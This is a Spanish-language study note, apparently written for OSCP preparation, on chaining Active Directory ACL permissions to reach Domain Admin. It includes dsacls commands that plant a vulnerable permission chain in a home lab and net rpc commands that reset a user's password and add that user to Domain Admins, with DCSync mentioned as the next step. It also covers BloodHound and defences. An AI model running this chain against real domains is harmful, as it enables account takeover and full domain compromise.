# ACL Abuse — encadenar permisos hasta Domain Admin

> **En una frase:** en AD un permiso puede ser **poder SOBRE otra cuenta** (resetear su pass, controlarla). Si controlas una cuenta, **te conviertes en ella** y ganas SUS poderes; si uno de esos poderes es controlar a alguien más importante, **saltas** → y encadenando saltos llegas a Domain Admin. BloodHound dibuja esa ruta.
> Relacionado: [[kerberos-kdc]] · [[kerberoasting]] · [[asrep-roasting]] · [[agdlp-y-bloodhound]] · [[montar-lab-ad]]

---

## El cambio de chip
Un permiso normal = *"acceso a una carpeta"*. Aquí el permiso = **poder sobre otro objeto** (usuario, grupo).
> **Regla de oro:** si puedo controlar tu cuenta (p.ej. resetear tu pass), **me convierto en ti** y tengo todo lo tuyo.

Tomar una cuenta **no es el premio** — es ganar sus permisos, que son el **billete al siguiente salto**. Vas acumulando poder hasta que una cuenta tiene "la llave de la caja fuerte" (control sobre Domain Admins).

## La analogía — llaveros de empresa
- Eres **Piotr**, empleado normal, llavero cutre.
- Piotr puede **pedir duplicado de la llave de Robert** (ForceChangePassword) → ahora tienes el llavero de Robert.
- Robert tiene la **llave maestra de la caja fuerte** (control sobre Domain Admins) → la usas → eres el jefe.

## Los permisos peligrosos
| Permiso | Qué te deja hacer sobre la víctima | Cómo lo abusas |
|---|---|---|
| **GenericAll** | Control total | Todo: reset pass, add a grupo, etc. |
| **GenericWrite** | Escribir casi todos sus atributos | Le pones un SPN (Kerberoasting dirigido) o cambias su logonScript |
| **ForceChangePassword** | Resetear su pass **sin saber la antigua** | Nueva pass → te logueas como ella |
| **WriteDacl** | Reescribir su ACL | Te auto-concedes GenericAll |
| **WriteOwner** | Hacerte **dueño** del objeto | Como dueño, te das los permisos que quieras |
| **AddMember** (sobre grupo) | Añadir miembros | Te metes tú en un grupo privilegiado |

## Por qué es un FALLO (no algo normal)
- Un empleado normal **no debería** poder resetear a otro (eso es del Help Desk).
- Un usuario **jamás** debería tener control total sobre Domain Admins.
- En la realidad pasa: delegaciones con prisa, permisos "temporales" olvidados, herencia que nadie revisa. Invisibles... hasta que BloodHound pinta la flecha roja.

## Qué hace BloodHound
1. **SharpHound** (recolector) corre con cualquier credencial → vuelca TODAS las ACLs, membresías y sesiones a JSON.
2. **BloodHound** (visor, grafos Neo4j) los importa → preguntas *"Shortest path from X to Domain Admins"* → te dibuja la cadena.

---

## El escenario que planté en el lab (2026-10-17)
Cadena de 2 saltos, arrancando desde `piotr` (comprometido vía [[asrep-roasting]]):

```
piotr.wisniewski ──ForceChangePassword──► robert.dabrowski ──GenericAll(grupo)──► Domain Admins
```

```powershell
# Salto 1: piotr puede resetear la pass de robert
$robert = (Get-ADUser robert.dabrowski).DistinguishedName
dsacls "$robert" /G "NORDWIND\piotr.wisniewski:CA;Reset Password"

# Salto 2: robert tiene control total sobre el grupo Domain Admins
$da = (Get-ADGroup "Domain Admins").DistinguishedName
dsacls "$da" /G "NORDWIND\robert.dabrowski:GA"

# Verificar
dsacls "$robert" | Select-String "piotr"    # → Allow ... Reset Password
dsacls "$da"     | Select-String "robert"   # → Allow ... FULL CONTROL
```
**`dsacls`:** herramienta nativa para editar ACLs de objetos AD. `/G` = Grant · `CA;Reset Password` = Control Access (derecho extendido) ForceChangePassword · `GA` = Generic All.

---

## El ataque real (desde Kali) — PENDIENTE: fase de atacar
> Aún NO ejecutado. La cadena completa de cero a DA:

```bash
# 0. Partida: crackeo a piotr (AS-REP) → tengo su pass
# 1. Como piotr, reseteo la pass de robert (ForceChangePassword)
net rpc password robert.dabrowski 'NuevaPass123!' -U nordwind.local/piotr.wisniewski%'<pass_piotr>' -S 192.168.10.10
#    o con PowerView / Set-DomainUserPassword

# 2. Como robert, me añado a Domain Admins (GenericAll sobre el grupo)
net rpc group addmem "Domain Admins" robert.dabrowski -U nordwind.local/robert.dabrowski%'NuevaPass123!' -S 192.168.10.10
#    o con PowerView / Add-DomainGroupMember

# 3. robert ya es Domain Admin → DCSync, dump de hashes, etc.
```
- [ ] Recolectar con SharpHound y confirmar que BloodHound pinta la ruta piotr → Domain Admins
- [ ] Ejecutar la cadena y confirmar robert en Domain Admins
- [ ] Capturar el grafo de BloodHound para el writeup

## Defensa
1. **Revisar delegaciones** periódicamente (con BloodHound desde el lado defensivo).
2. **Tiered model**: cuentas privilegiadas separadas, nunca control de usuarios normales sobre grupos admin.
3. **Quitar permisos "temporales"** olvidados; auditar `WriteDacl`/`WriteOwner`/`GenericAll` sobre objetos sensibles.
4. **Proteger grupos privilegiados** (AdminSDHolder restaura ACLs sanas automáticamente cada 60 min).

## Dónde cae en el OSCP
Set de AD (40 pts): tras el primer foothold (Kerberoast/AS-REP), BloodHound es **la** herramienta para encontrar la ruta al DC. 100% examen-friendly. → [[agdlp-y-bloodhound]].
